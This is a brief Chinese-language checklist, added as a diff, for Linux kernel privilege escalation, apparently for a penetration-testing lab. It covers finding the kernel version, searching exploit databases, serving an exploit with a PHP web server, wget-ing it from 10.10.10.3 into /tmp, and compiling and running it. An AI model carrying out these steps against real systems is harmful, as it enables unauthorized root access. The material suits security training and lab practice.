@@ -1,0 +1,15 @@
+使用uname -a 查看系统版本
+
+如果是低版本系统
+使用searchspoit linux kernel 版本号（不要过于详细)
+
+下载相关漏洞脚本
+searchspoit linux kernel -m 漏洞数字编号（下载时需要去掉版本号防止下载错误)
+
+建立Web服务器供靶机下载(在下载漏洞文件的目录)
+sudo php -S 0:80
+
+在控制的主机命令行切换到 /tmp目录之中使用wget 下载web服务器上的漏洞文件
+wget http://10.10.10.3/15285.c
+
+使用gcc编译并执行
